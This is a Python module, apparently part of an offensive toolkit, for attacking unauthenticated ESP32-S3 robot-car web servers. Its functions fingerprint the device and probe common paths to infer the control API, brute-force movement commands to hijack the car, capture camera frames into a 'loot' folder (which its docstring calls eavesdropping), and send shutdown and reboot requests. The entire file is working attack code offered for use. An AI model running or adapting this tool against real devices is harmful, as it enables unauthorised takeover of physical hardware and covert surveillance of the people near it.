"""HTTP web-control vector against the ESP32-S3 Arduino web server.

The Arduino sketch typically serves a tiny HTML control pad whose buttons call
endpoints like /forward, /cmd?dir=F, or POST /move {"dir":"fwd"}. There's no
auth. This module:
  discover()  - fingerprint server, crawl links, parse HTML <form>s and JS
                fetch/XHR/WebSocket calls to infer the command API
  drive()     - replay a direction command against a discovered/declared endpoint
  camera()    - locate & tap an MJPEG/stream endpoint (eavesdrop)
  shutdown()  - hit an off/stop endpoint
"""
from __future__ import annotations
import re, time, urllib.parse as up
from . import util

try:
    import requests
    HAVE_REQ = True
except Exception:
    HAVE_REQ = False

COMMON_PATHS = [
    "/", "/index.html", "/control", "/controls", "/cmd", "/command", "/move",
    "/drive", "/go", "/api", "/api/move", "/set", "/motor", "/motors", "/car",
    "/robot", "/status", "/state", "/forward", "/backward", "/back", "/left",
    "/right", "/stop", "/halt", "/off", "/shutdown", "/reset", "/reboot",
    "/stream", "/mjpeg", "/video", "/cam", "/capture", "/jpg", "/snapshot", "/led",
]
DIR_WORDS = {"forward": ("forward", "fwd", "up", "F", "f", "1"),
             "backward": ("backward", "back", "down", "B", "b", "2"),
             "left": ("left", "L", "l", "3"),
             "right": ("right", "R", "r", "4"),
             "stop": ("stop", "halt", "S", "s", "0")}

_FETCH_RE = re.compile(r"""fetch\(\s*[`'"]([^`'"]+)[`'"]""", re.I)
_XHR_RE   = re.compile(r"""\.open\(\s*['"](GET|POST)['"]\s*,\s*[`'"]([^`'"]+)""", re.I)
_WS_RE    = re.compile(r"""new\s+WebSocket\(\s*[`'"]([^`'"]+)""", re.I)
_HREF_RE  = re.compile(r"""(?:href|src|action)\s*=\s*['"]([^'"]+)['"]""", re.I)
_FORM_RE  = re.compile(r"<form[^>]*>(.*?)</form>", re.I | re.S)
_ACTION_RE= re.compile(r"""action\s*=\s*['"]([^'"]+)['"]""", re.I)
_METHOD_RE= re.compile(r"""method\s*=\s*['"]([^'"]+)['"]""", re.I)
_INPUT_RE = re.compile(r"""<(?:input|button|select)[^>]*name\s*=\s*['"]([^'"]+)['"][^>]*""", re.I)
_ONCLICK  = re.compile(r"""on(?:click|mousedown)\s*=\s*['"]([^'"]+)['"]""", re.I)


def _base(host: str) -> str:
    if not host.startswith("http"):
        host = "http://" + host
    return host.rstrip("/")


def discover(host: str, timeout: float = 3.0) -> dict:
    if not HAVE_REQ:
        util.err("requests not installed — `pip install requests`")
        return {}
    base = _base(host)
    util.rule("WEB CONTROL DISCOVERY")
    util.info(f"fingerprinting {base}")
    sess = requests.Session()
    found_paths, endpoints, forms, streams, sockets = [], [], [], [], []
    server_hdr = ""

    # root page first — richest source of truth
    try:
        r = sess.get(base + "/", timeout=timeout)
        server_hdr = r.headers.get("Server", "")
        util.hit(f"root {r.status_code} {len(r.content)}B  Server: {server_hdr or '?'}")
        html = r.text
        endpoints += _FETCH_RE.findall(html)
        endpoints += [m[1] for m in _XHR_RE.findall(html)]
        sockets += _WS_RE.findall(html)
        for href in _HREF_RE.findall(html):
            if not href.startswith(("http", "data:", "#", "javascript:")):
                endpoints.append(href)
        for oc in _ONCLICK.findall(html):
            endpoints += _FETCH_RE.findall(oc)
            endpoints += [m for m in re.findall(r"""['"](/[A-Za-z0-9_\-/?=&.]+)['"]""", oc)]
        for body in _FORM_RE.findall(html):
            action = (_ACTION_RE.search(body) or [None, ""])
            method = (_METHOD_RE.search(body) or [None, "GET"])
            fields = _INPUT_RE.findall(body)
            forms.append({"action": action[1] if hasattr(action, "__getitem__") else "",
                          "method": (method[1] if hasattr(method, "__getitem__") else "GET").upper(),
                          "fields": fields})
    except Exception as e:
        util.warn(f"root fetch failed: {e}")

    # probe common paths
    for p in COMMON_PATHS:
        url = base + p
        try:
            r = sess.get(url, timeout=timeout, stream=True)
            ct = r.headers.get("Content-Type", "")
            if r.status_code < 400:
                found_paths.append((p, r.status_code, ct))
                if "multipart/x-mixed-replace" in ct or "mjpeg" in ct.lower() or p in ("/stream", "/mjpeg", "/video"):
                    streams.append((p, ct))
            r.close()
        except Exception:
            pass

    endpoints = sorted({e.split("?")[0] if "?" in e else e for e in endpoints if e and e not in ("/",)})

    util.table("Reachable paths", ["path", "code", "content-type"],
               [[p, c, ct] for (p, c, ct) in found_paths] or [])
    if endpoints:
        util.table("Endpoints referenced in page JS/HTML", ["endpoint"], [[e] for e in endpoints])
    if forms:
        util.table("HTML forms (POST/GET control)", ["action", "method", "fields"],
                   [[f["action"] or "(self)", f["method"], ", ".join(f["fields"]) or "-"] for f in forms])
    if streams:
        util.table("Camera stream endpoints", ["path", "content-type"], [[s, c] for s, c in streams])
    if sockets:
        util.table("WebSocket control", ["url"], [[s] for s in sockets])

    spec = _infer_command_spec(base, found_paths, endpoints, forms)
    if spec:
        util.panel("INFERRED CONTROL API",
                   f"base      : {base}\n"
                   f"method    : {spec['method']}\n"
                   f"endpoint  : {spec['endpoint']}\n"
                   f"direction : {spec['style']}\n"
                   f"example   : {spec['example']}", "green")
    else:
        util.warn("could not auto-infer a drive API — inspect the tables above and pass "
                  "`rossy web drive --endpoint ... --param ...` manually")
    return {"base": base, "server": server_hdr, "paths": found_paths,
            "endpoints": endpoints, "forms": forms, "streams": streams,
            "sockets": sockets, "spec": spec}


def _infer_command_spec(base, paths, endpoints, forms):
    path_set = {p for p, _, _ in paths}
    ep_set = set(endpoints)
    # style A: distinct direction paths (/forward, /left, ...)
    dir_paths = {d: p for d in DIR_WORDS for p in (path_set | ep_set)
                 if p.strip("/").lower() in {w.lower() for w in (d,) + DIR_WORDS[d]}}
    if len(dir_paths) >= 2:
        return {"method": "GET", "endpoint": "/<direction>", "style": "path-per-direction",
                "map": dir_paths, "example": f"GET {base}{dir_paths.get('forward', '/forward')}"}
    # style B: a form or endpoint that takes a dir param
    for f in forms:
        if f["fields"]:
            return {"method": f["method"] or "POST", "endpoint": f["action"] or "/",
                    "style": "param", "param": f["fields"][0],
                    "example": f"{f['method']} {base}{f['action'] or '/'}  {f['fields'][0]}=forward"}
    for e in endpoints:
        if any(k in e.lower() for k in ("cmd", "move", "drive", "go", "set", "command")):
            return {"method": "GET", "endpoint": e.split("?")[0], "style": "param",
                    "param": "dir" if "dir" not in e else re.findall(r"[?&](\w+)=", e)[0:1] or "dir",
                    "example": f"GET {base}{e.split('?')[0]}?dir=forward"}
    if "/cmd" in path_set:
        return {"method": "GET", "endpoint": "/cmd", "style": "param", "param": "dir",
                "example": f"GET {base}/cmd?dir=forward"}
    return None


def drive(host, direction, spec=None, endpoint=None, param=None, method=None,
          value=None, timeout=3.0):
    base = _base(host)
    sess = requests.Session()
    direction = direction.lower()
    tries = []

    if endpoint:  # manual override
        m = (method or "GET").upper()
        if param:
            tries.append((m, base + endpoint, {param: value or direction}))
        else:
            tries.append((m, base + endpoint, None))
    elif spec and spec.get("style") == "path-per-direction":
        p = spec["map"].get(direction) or ("/" + direction)
        tries.append(("GET", base + p, None))
    elif spec and spec.get("style") == "param":
        for v in (value,) + DIR_WORDS.get(direction, (direction,)):
            if v:
                tries.append((spec.get("method", "GET"), base + spec["endpoint"], {spec["param"]: v}))
    else:  # brute the common shapes
        tries += [("GET", base + "/" + direction, None),
                  ("GET", base + "/cmd", {"dir": direction}),
                  ("GET", base + "/move", {"dir": direction}),
                  ("POST", base + "/cmd", {"dir": direction})]

    for m, url, params in tries:
        try:
            if m == "POST":
                r = sess.post(url, data=params, json=params, timeout=timeout)
            else:
                r = sess.get(url, params=params, timeout=timeout)
            tag = f"{m} {url} {params or ''}"
            if r.status_code < 400:
                util.hit(f"OK  {tag}  -> {r.status_code}")
                return True
            else:
                util.warn(f"{r.status_code} {tag}")
        except Exception as e:
            util.warn(f"err {m} {url}: {e}")
    util.err(f"could not deliver '{direction}' — inspect `rossy web discover` output")
    return False


def camera(host, stream_path=None, seconds=5.0, timeout=4.0):
    base = _base(host)
    sess = requests.Session()
    candidates = [stream_path] if stream_path else ["/stream", "/mjpeg", "/video", "/cam", "/:81/stream"]
    for p in candidates:
        if not p:
            continue
        url = base + p if p.startswith("/") else p
        try:
            util.info(f"tapping camera {url}")
            r = sess.get(url, timeout=timeout, stream=True)
            ct = r.headers.get("Content-Type", "")
            if r.status_code >= 400:
                r.close(); continue
            util.hit(f"stream open {url}  {ct}")
            buf, frames, t0 = b"", 0, time.time()
            for chunk in r.iter_content(4096):
                buf += chunk
                while True:
                    a = buf.find(b"\xff\xd8"); b = buf.find(b"\xff\xd9", a + 2)
                    if a != -1 and b != -1:
                        jpg = buf[a:b + 2]; buf = buf[b + 2:]
                        frames += 1
                        if frames == 1 or frames % 10 == 0:
                            path = f"loot/web_cam_{int(time.time())}.jpg"
                            import os; os.makedirs("loot", exist_ok=True)
                            open(path, "wb").write(jpg)
                            util.hit(f"grabbed frame {frames} -> {path} ({len(jpg)}B)")
                    else:
                        break
                if time.time() - t0 > seconds:
                    break
            r.close()
            util.ok(f"captured {frames} camera frames from {url}")
            return True
        except Exception as e:
            util.warn(f"{url}: {e}")
    util.err("no camera stream found — check port 81 (ESP32-CAM default): `rossy web camera --stream :81/stream`")
    return False


def shutdown(host, endpoint=None, timeout=3.0):
    base = _base(host)
    sess = requests.Session()
    paths = [endpoint] if endpoint else ["/shutdown", "/off", "/stop", "/halt", "/reboot", "/reset", "/power?state=off"]
    done = False
    for p in paths:
        if not p:
            continue
        url = base + (p if p.startswith("/") else "/" + p)
        for m in ("GET", "POST"):
            try:
                r = sess.request(m, url, timeout=timeout)
                if r.status_code < 400:
                    util.hit(f"shutdown {m} {url} -> {r.status_code}")
                    done = True
            except Exception:
                pass
    util.ok("web shutdown attempts sent") if done else util.err("no shutdown endpoint responded")
    return done
